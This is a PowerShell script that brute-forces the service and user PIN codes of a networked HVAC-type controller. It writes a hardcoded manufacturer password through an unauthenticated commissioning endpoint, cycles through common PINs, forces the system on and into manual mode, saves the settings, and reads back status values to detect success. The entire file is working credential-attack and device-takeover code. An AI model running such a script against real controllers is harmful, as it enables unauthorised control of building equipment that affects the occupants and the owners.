param(
  [string]$Device = 'http://169.254.61.68',
  [switch]$NoProxy,
  [string]$ProxyHost = 'localhost',
  [int]$ProxyPort = 8005,
  [string[]]$Codes = @('0000','0001','0002','0010','0011','0020','1111','1234','4321','8888','9999','1489')
)

$ErrorActionPreference = 'Stop'

function MakeUri([string]$path, [string]$qs){
  $inner = $Device.TrimEnd('/') + '/' + $path
  if($qs){ $inner += ('?' + $qs) }
  if($NoProxy){ return $inner }
  $proxy = ("http://{0}:{1}/proxy?url=" -f $ProxyHost, $ProxyPort)
  return $proxy + [System.Uri]::EscapeDataString($inner)
}

function TryPostForm([string]$path, [string]$body){
  $url = MakeUri $path ''
  try { return Invoke-WebRequest -UseBasicParsing -Method Post -Uri $url -ContentType 'application/x-www-form-urlencoded' -Body $body -TimeoutSec 8 } catch { return $_.Exception.Response }
}
function TryGet([string]$path, [string]$qs){
  $url = MakeUri $path $qs
  try { return Invoke-WebRequest -UseBasicParsing -Method Get -Uri $url -TimeoutSec 8 } catch { return $_.Exception.Response }
}
function Show([string]$title, $resp){ if($resp -is [string]){ Write-Host ("$title -> $resp") } elseif($resp){ Write-Host ("$title -> Status=" + $resp.StatusCode + " Len=" + ([string]$resp.Content).Length) } else { Write-Host ("$title -> no response") } }

function ReadId([int]$id, [string]$label){
  $resp = TryGet 'commissioning/getvar.csv' ('id=' + $id)
  $content = ''
  if($resp -and ($resp -isnot [string])){ $content = ($resp.Content).Trim() } else { $content = [string]$resp }
  Write-Host ($content)
  return $content
}

function ParseVal([string]$line){
  if(-not $line){ return $null }
  $parts = $line -split ','
  if($parts.Length -lt 6){ return $null }
  $raw = $parts[$parts.Length-1].Trim()
  $raw = $raw.Trim('"')
  if($raw){ return $raw }
  return $null
}

Write-Host 'BEGIN bruteforce_service_user_codes'

# Known IDs
$ids = @{ PwdManuf=8098; PwdService=8101; PwdUser=8103; KeybOnOff=6897; SysEnabled=9373; SysManAct=9376; SysMan=9375; SaveData=8376; CurrUnitStatus=5541; CurrRoomTempSP=5539 }

foreach($c in $Codes){
  Write-Host ("=== TRY CODE " + $c + " ===")
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.PwdManuf + '&value=4189') | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.PwdService + '&value=' + $c) | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.PwdUser + '&value=' + $c) | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.KeybOnOff + '&value=1') | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.SysEnabled + '&value=1') | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.SysManAct + '&value=1') | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.SysMan + '&value=3') | Out-Null
  TryPostForm 'commissioning/setvar.csv' ('id=' + $ids.SaveData + '&value=1') | Out-Null

  Start-Sleep -Milliseconds 600

  $enabledLine = ReadId $ids.SysEnabled 'SystemStatus.Enabled'
  $manActLine  = ReadId $ids.SysManAct  'SystemStatus.ManAct'
  $manLine     = ReadId $ids.SysMan     'SystemStatus.Man'
  $unitLine    = ReadId $ids.CurrUnitStatus 'CurrUnitStatus'
  $spLine      = ReadId $ids.CurrRoomTempSP 'CurrRoomTempSetP_Val'

  $enabledVal = ParseVal $enabledLine
  $manActVal  = ParseVal $manActLine
  $manVal     = ParseVal $manLine
  $unitVal    = ParseVal $unitLine
  $spVal      = ParseVal $spLine

  Write-Host ("RESULT code=" + $c + " enabled=" + $enabledVal + " manAct=" + $manActVal + " man=" + $manVal + " unit=" + $unitVal + " sp=" + $spVal)

  if(($enabledVal -eq '1') -or ($manActVal -eq '1') -or ($unitVal -ne '0')){
    Write-Host ('SUCCESS with code ' + $c)
    break
  }
}

Write-Host 'END bruteforce_service_user_codes'